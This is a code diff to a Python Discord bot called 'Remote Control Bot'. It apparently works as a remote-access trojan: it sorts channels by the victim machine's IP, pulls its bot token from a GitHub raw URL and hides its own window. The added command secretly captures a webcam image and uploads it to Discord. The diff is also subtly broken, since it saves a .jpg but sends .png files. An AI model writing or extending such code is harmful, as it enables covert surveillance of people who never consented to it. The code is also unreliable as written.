@@ -207,11 +207,37 @@ async def stop_live_session(interaction : Interaction):
         await interaction.send(embed=embed)
         await interaction.delete_original_message()
 
+@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
+async def take_picture(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Taking picture...")
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            print("Could not open webcam.")
+            exit()
+        ret, frame = cap.read()
+        if not ret:
+            print("Failed to grab frame.")
+            cap.release()
+            exit()
+        cv2.imwrite('captured_image.jpg', frame)
+        cap.release()
 
+        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
+        embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_image(url=f"attachment://status.png")
+        embed.set_footer(text="Remote Control Bot v1.3")
+
+        await interaction.send(embed=embed, file=file)
+        await interaction.delete_original_message()
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
-stripped_string = token[1:]  # Slicing from the second character to the second-to-last character
+stripped_string = token[1:]
 client.run(stripped_string)
 hwnd = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
